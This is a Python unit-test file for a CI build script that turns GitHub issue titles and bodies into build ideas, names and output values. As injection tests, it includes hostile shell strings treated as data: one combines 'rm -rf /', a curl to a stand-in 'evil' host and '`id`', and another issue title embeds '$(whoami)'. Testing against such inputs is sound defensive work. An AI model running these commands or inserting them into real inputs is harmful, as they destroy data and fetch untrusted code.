"""scripts/ci_build.py: the only code that touches issue text in CI (ADR-009)."""

from __future__ import annotations

from datetime import datetime, timezone
from pathlib import Path
from unittest import mock
import importlib.util
import os
import tempfile
import unittest

_PATH = Path(__file__).resolve().parent.parent / "scripts" / "ci_build.py"
_spec = importlib.util.spec_from_file_location("ci_build", _PATH)
ci_build = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(ci_build)


class ComposeIdeaTests(unittest.TestCase):
    def test_title_prefixes_are_dropped_and_body_appended(self):
        self.assertEqual(ci_build.compose_idea("[rocto] 做一个待办清单", ""), "做一个待办清单")
        self.assertEqual(ci_build.compose_idea("Build: a timer", "with a reset"), "a timer\n\nwith a reset")

    def test_long_bodies_are_capped(self):
        idea = ci_build.compose_idea("t", "x" * 10_000)
        self.assertLessEqual(len(idea), ci_build.MAX_IDEA_CHARS)

    def test_shell_metacharacters_are_just_text(self):
        hostile = '"; rm -rf / #$(curl evil)`id`'
        self.assertEqual(ci_build.compose_idea(hostile, ""), hostile.strip())


class NameTests(unittest.TestCase):
    def test_issue_builds_are_named_after_the_issue(self):
        self.assertEqual(ci_build.build_name("12", "A Todo List"), "issue-12-a-todo-list")
        self.assertEqual(ci_build.build_name("12", "做一个番茄钟"), "issue-12-build")

    def test_manual_runs_are_timestamped(self):
        now = datetime(2026, 9, 26, 1, 2, 3, tzinfo=timezone.utc)
        self.assertEqual(ci_build.build_name("", "timer", now), "20260926-010203-timer")


class MainTests(unittest.TestCase):
    def test_outputs_are_written_and_the_idea_is_one_argument(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            output_file = root / "out.txt"
            output_file.write_text("", encoding="utf-8")
            seen = {}

            def fake_main(argv):
                seen["argv"] = argv
                return 4

            env = {
                "ISSUE_NUMBER": "7",
                "ISSUE_TITLE": "[rocto] $(whoami) timer",
                "ISSUE_BODY": "",
                "ROCTO_OUTPUT_ROOT": str(root / "builds"),
                "GITHUB_OUTPUT": str(output_file),
            }
            with mock.patch.dict(os.environ, env), mock.patch.object(ci_build.cli, "main", fake_main):
                self.assertEqual(ci_build.main(), 0)
            self.assertEqual(seen["argv"][:2], ["build", "$(whoami) timer"])
            outputs = dict(
                line.split("=", 1) for line in output_file.read_text(encoding="utf-8").splitlines()
            )
            self.assertEqual(outputs["exit_code"], "4")
            self.assertEqual(outputs["name"], "issue-7-whoami-timer")
            self.assertEqual(outputs["verdict"], "failed")

    def test_empty_idea_is_reported_not_built(self):
        with tempfile.TemporaryDirectory() as tmp:
            output_file = Path(tmp) / "out.txt"
            env = {"ISSUE_TITLE": "   ", "ISSUE_BODY": "", "DISPATCH_IDEA": "", "GITHUB_OUTPUT": str(output_file)}
            with mock.patch.dict(os.environ, env), mock.patch.object(ci_build.cli, "main") as run:
                ci_build.main()
            run.assert_not_called()
            self.assertIn("exit_code=2", output_file.read_text(encoding="utf-8"))


if __name__ == "__main__":
    unittest.main()
